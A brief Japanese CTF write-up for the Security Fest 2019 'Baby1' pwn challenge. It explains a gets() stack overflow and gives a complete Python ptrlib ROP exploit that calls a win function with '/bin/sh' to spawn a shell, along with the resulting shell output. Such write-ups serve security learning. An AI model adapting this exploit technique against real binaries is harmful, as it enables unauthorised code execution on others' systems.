# [pwn 146pts] Baby1 - Security Fest 2019
64ビットでRELROが有効です。
```
$ checksec -f baby1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols     No	0		4	baby1
```

getsによるStack Overflowがあります。
また、第一引数をsystem関数に投げるwin関数があるので、これを利用しましょう。
`/bin/sh`という文字列はバイナリ中に含まれているのでこれを使います。

```python
from ptrlib import *

elf = ELF("./baby1")
sock = Process("./baby1")
rop_pop_rdi = 0x00400793

payload = b"A" * 0x18
payload += p64(rop_pop_rdi)
payload += p64(0x400000 + next(elf.find("/bin/sh")))
payload += p64(elf.symbol("win") + 1)
sock.sendline(payload)

sock.interactive()
```

簡単ですね。
```
...
input:  
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
Harekaze CTFのBaby ROPとまったく同じですね。